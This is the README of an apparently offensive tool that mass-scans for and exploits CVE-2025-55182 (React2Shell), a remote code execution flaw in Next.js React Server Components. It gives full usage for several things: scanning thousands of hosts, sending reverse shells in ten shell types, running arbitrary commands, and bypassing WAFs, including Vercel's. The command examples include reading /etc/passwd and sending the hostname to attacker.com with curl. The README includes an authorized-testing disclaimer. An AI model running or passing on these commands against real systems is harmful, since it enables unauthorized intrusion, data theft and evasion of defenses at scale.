# CVE-2025-55182 Scanner

A high-performance scanner and exploitation tool for CVE-2025-55182 (React2Shell), a critical remote code execution vulnerability in Next.js React Server Components.

[![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.21-blue.svg)](https://golang.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-3.0.0-blue.svg)](https://github.com/yourusername/react2shell)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
  - [Using Go Install](#using-go-install)
  - [Building from Source](#building-from-source)
  - [Adding Go Bin to PATH](#adding-go-bin-to-path)
- [Usage](#usage)
  - [Scanning](#scanning)
  - [Exploitation](#exploitation)
  - [Command Execution](#command-execution)
- [Examples](#examples)
- [Options Reference](#options-reference)
- [WAF Bypass Techniques](#waf-bypass-techniques)
- [References](#references)
- [Disclaimer](#disclaimer)

## Overview

CVE-2025-55182, also known as React2Shell, is a critical remote code execution vulnerability affecting Next.js applications using React Server Components (RSC). The vulnerability allows unauthenticated attackers to execute arbitrary code on vulnerable servers through specially crafted RSC payloads.

This tool provides:

- **Mass scanning** capabilities for identifying vulnerable hosts at scale
- **Safe detection mode** that identifies potentially vulnerable targets without executing code
- **Exploitation** functionality for authorized penetration testing
- **WAF bypass** techniques for testing protected environments

For detailed technical analysis of the vulnerability, see:

- [React2Shell Official Site](https://react2shell.com/)
- [Google Cloud Threat Intelligence Analysis](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182)
- [Cloudflare Threat Brief](https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/)

## Features

- **High-Performance Scanning**: Optimized for scanning thousands of targets with configurable concurrency
- **Memory Management**: Built-in memory limiter for resource-constrained environments
- **Stream Mode**: Minimal memory footprint for large-scale scanning operations
- **Safe Detection**: Identify vulnerable targets without triggering code execution
- **Multiple Shell Types**: Support for bash, sh, netcat, python, perl, ruby, php, and node reverse shells
- **WAF Bypass**: Multiple techniques for bypassing web application firewalls
- **Flexible Output**: JSON output support for integration with other tools
- **TLS Support**: Full TLS/SSL support with certificate verification options

## Installation

### Using Go Install

The simplest method to install react2shell is using `go install`:

```bash
go install github.com/yourusername/react2shell@latest
```

This will download, compile, and install the binary to your `$GOPATH/bin` directory.

### Building from Source

```bash
# Clone the repository
git clone https://github.com/yourusername/react2shell.git
cd react2shell

# Build the binary
go build -o react2shell .

# Optional: Install to GOPATH/bin
go install .
```

### Adding Go Bin to PATH

If the `go install` command succeeds but you cannot run the tool, you need to add Go's bin directory to your PATH.

**Linux / macOS (bash/zsh):**

```bash
# Add to ~/.bashrc, ~/.zshrc, or ~/.profile
export PATH=$PATH:$(go env GOPATH)/bin

# Reload your shell configuration
source ~/.bashrc  # or ~/.zshrc
```

**Linux / macOS (fish):**

```fish
# Add to ~/.config/fish/config.fish
set -gx PATH $PATH (go env GOPATH)/bin
```

**Windows (PowerShell):**

```powershell
# Add to your PowerShell profile
$env:PATH += ";$(go env GOPATH)\bin"

# To make permanent, add to $PROFILE
Add-Content $PROFILE "`n`$env:PATH += `";$(go env GOPATH)\bin`""
```

**Windows (Command Prompt):**

```cmd
# Temporary (current session only)
set PATH=%PATH%;%GOPATH%\bin

# Permanent (requires admin privileges)
setx PATH "%PATH%;%GOPATH%\bin"
```

Verify the installation:

```bash
react2shell version
```

## Usage

react2shell operates in three modes: `scan`, `exploit`, and `exec`.

```
react2shell <command> [options]

Commands:
  scan      Scan targets for vulnerability
  exploit   Send reverse shell payload
  exec      Execute arbitrary command
  version   Show version
  help      Show help
```

### Scanning

The `scan` command identifies vulnerable Next.js applications.

```bash
# Basic scan of a single target
react2shell scan -u example.com

# Scan with custom port and HTTP (no TLS)
react2shell scan -u 192.168.1.100 -p 3000 -no-tls

# Safe mode detection (no code execution)
react2shell scan -u example.com -safe
```

### Exploitation

The `exploit` command sends a reverse shell payload to a confirmed vulnerable target.

```bash
# Basic exploitation
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444

# With verbose output to see request/response
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v
```

**Important:** Start your listener before running the exploit:

```bash
nc -lvnp 4444
```

### Command Execution

The `exec` command executes a single command on the target.

```bash
# Execute a command
react2shell exec -u example.com -c 'id'

# With verbose output
react2shell exec -u example.com -c 'whoami' -v
```

## Examples

### Single Target Scanning

```bash
# Scan a single HTTPS target on default port 443
react2shell scan -u example.com

# Scan a target on a custom port with HTTP
react2shell scan -u 192.168.1.100 -p 3000 -no-tls

# Scan with a specific path
react2shell scan -u example.com -path /api/actions

# Safe detection mode (recommended for initial reconnaissance)
react2shell scan -u example.com -safe

# Verbose output showing all results
react2shell scan -u example.com -v
```

### Mass Scanning

```bash
# Scan multiple targets from a file
react2shell scan -l targets.txt -t 50 -o vulnerable.txt

# High-performance scanning with memory limits
react2shell scan -l targets.txt -t 5000 -stream -o vuln.txt -max-mem 8192

# Scan with 100 threads and save results
react2shell scan -l targets.txt -t 100 -o results.txt

# JSON output for tool integration
react2shell scan -l targets.txt -t 50 -json > results.json

# Quiet mode with output file only
react2shell scan -l targets.txt -t 100 -q -o vulnerable.txt

# Stream mode for minimal memory usage on large target lists
react2shell scan -l large_targets.txt -t 1000 -stream -max-mem 4096 -o vuln.txt
```

### WAF Bypass Scanning

```bash
# Enable WAF bypass with default 128KB junk data
react2shell scan -u example.com -waf-bypass

# WAF bypass with custom junk data size (256KB)
react2shell scan -u example.com -waf-bypass -waf-bypass-size 256

# Vercel-specific WAF bypass
react2shell scan -u example.com -vercel-waf-bypass

# Mass scan with WAF bypass
react2shell scan -l targets.txt -t 50 -waf-bypass -o vuln.txt
```

### Exploitation

```bash
# Basic reverse shell exploitation
react2shell exploit -u vulnerable.example.com -lhost 10.0.0.5 -lport 4444

# Exploit target on custom port with HTTP
react2shell exploit -u 192.168.1.100 -p 3000 -no-tls -lhost 10.0.0.5 -lport 4444

# Use bash reverse shell instead of node
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -shell bash

# Use netcat reverse shell
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -shell nc

# Use Python reverse shell
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -shell python3

# Verbose mode to debug exploitation
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v

# Exploit with custom path
react2shell exploit -u example.com -path /app -lhost 10.0.0.5 -lport 4444

# Extended timeout for slow targets
react2shell exploit -u example.com -lhost 10.0.0.5 -lport 4444 -timeout 60
```

### Command Execution

```bash
# Execute a simple command
react2shell exec -u vulnerable.example.com -c 'id'

# Execute command on HTTP target
react2shell exec -u 192.168.1.100 -p 3000 -no-tls -c 'whoami'

# Execute with verbose output
react2shell exec -u example.com -c 'cat /etc/passwd' -v

# Execute a more complex command
react2shell exec -u example.com -c 'curl http://attacker.com/callback?data=$(hostname)'

# Execute on custom path
react2shell exec -u example.com -path /api -c 'ls -la'
```

### Pipeline Integration

```bash
# Use with other tools via stdin
cat targets.txt | xargs -I {} react2shell scan -u {} -safe

# Parse JSON output with jq
react2shell scan -l targets.txt -json | jq '.[] | select(.vulnerable==true) | .host'

# Integration with nuclei output
nuclei -l urls.txt -t nextjs-detect.yaml -o nextjs-hosts.txt
react2shell scan -l nextjs-hosts.txt -t 100 -safe -o vulnerable.txt
```

## Options Reference

### Scan Options

| Option | Default | Description |
|--------|---------|-------------|
| `-u` | | Single target URL or IP |
| `-l` | | File containing targets (one per line) |
| `-p` | 443 | Target port |
| `-path` | / | Request path |
| `-no-tls` | false | Use HTTP instead of HTTPS |
| `-k` | true | Skip TLS certificate verification |
| `-timeout` | 10 | Request timeout in seconds |
| `-t` | 10 | Number of concurrent threads |
| `-safe` | false | Safe detection mode (no code execution) |
| `-o` | | Output file for vulnerable hosts |
| `-json` | false | JSON output format |
| `-v` | false | Verbose output |
| `-q` | false | Quiet mode |
| `-max-mem` | 0 | Maximum memory usage in MB (0 = unlimited) |
| `-stream` | false | Stream mode for minimal memory usage |
| `-waf-bypass` | false | Enable WAF bypass with junk data |
| `-waf-bypass-size` | 128 | Size of junk data in KB |
| `-vercel-waf-bypass` | false | Use Vercel-specific WAF bypass payload |

### Exploit Options

| Option | Default | Description |
|--------|---------|-------------|
| `-u` | | Target URL or IP (required) |
| `-p` | 443 | Target port |
| `-path` | / | Request path |
| `-no-tls` | false | Use HTTP instead of HTTPS |
| `-k` | true | Skip TLS certificate verification |
| `-timeout` | 30 | Request timeout in seconds |
| `-lhost` | | Listener IP address (required) |
| `-lport` | 4444 | Listener port |
| `-shell` | node | Shell type |
| `-v` | false | Verbose output (show full request/response) |

**Supported Shell Types:**

- `node` - Node.js reverse shell (default)
- `bash` - Bash reverse shell
- `sh` - POSIX shell reverse shell
- `nc` - Netcat with mkfifo
- `nc-e` - Netcat with -e flag
- `python` - Python 2 reverse shell
- `python3` - Python 3 reverse shell
- `perl` - Perl reverse shell
- `ruby` - Ruby reverse shell
- `php` - PHP reverse shell

### Exec Options

| Option | Default | Description |
|--------|---------|-------------|
| `-u` | | Target URL or IP (required) |
| `-p` | 443 | Target port |
| `-path` | / | Request path |
| `-no-tls` | false | Use HTTP instead of HTTPS |
| `-k` | true | Skip TLS certificate verification |
| `-timeout` | 30 | Request timeout in seconds |
| `-c` | | Command to execute (required) |
| `-v` | false | Verbose output (show full request/response) |

## WAF Bypass Techniques

react2shell includes multiple WAF bypass techniques for testing protected environments:

### Junk Data Bypass

The `-waf-bypass` flag prepends large amounts of random data to the payload, potentially exceeding WAF inspection limits:

```bash
react2shell scan -u example.com -waf-bypass -waf-bypass-size 256
```

### Vercel WAF Bypass

The `-vercel-waf-bypass` flag uses an alternative payload structure designed to bypass Vercel's WAF:

```bash
react2shell scan -u example.com -vercel-waf-bypass
```

## References

- [CVE-2025-55182 - React2Shell](https://react2shell.com/)
- [Google Cloud Threat Intelligence Analysis](https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182)
- [Cloudflare Threat Brief](https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/)
- [Assetnote React2Shell Scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Advisory](https://nextjs.org/security)

## Disclaimer

This tool is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for ensuring they have proper authorization before testing any systems.

The authors assume no liability for misuse of this tool or any damages resulting from its use. Always obtain explicit written permission before conducting security assessments.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

- [Assetnote](https://github.com/assetnote) for their research and original scanner implementation
- The security researchers who discovered and responsibly disclosed CVE-2025-55182
